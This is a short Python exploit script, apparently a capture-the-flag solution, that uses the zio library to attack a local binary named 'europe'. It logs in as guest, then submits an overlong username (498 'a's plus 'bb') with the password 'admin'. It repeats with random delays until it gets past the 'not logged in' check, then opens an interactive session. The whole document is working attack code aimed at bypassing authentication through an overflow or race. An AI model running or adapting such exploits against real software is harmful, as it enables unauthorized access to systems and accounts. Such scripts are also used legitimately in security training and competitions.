from zio import *
import time
import random

target = "./europe"
def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn(io):
	while True:
		io.read_until(" > ")
		io.write("1\n")
		io.read_until("Username: ")
		io.write("guest\n")
		io.read_until("Password: ")
		io.write("guest\n")
		io.read_until(" > ")
		io.write("1\n")
		io.read_until("Username: ")
		io.write('a' * 498 + "bb" + "\n")
		io.read_until("Password: ")
		io.write("admin\n")
		io.read_until(" > ")

		time.sleep(random.random())
		io.write("3\n")
		data = io.read_until("?")
		if data.find("You're not logged in") == -1:
			break

	io.interact()

io = get_io(target)
pwn(io)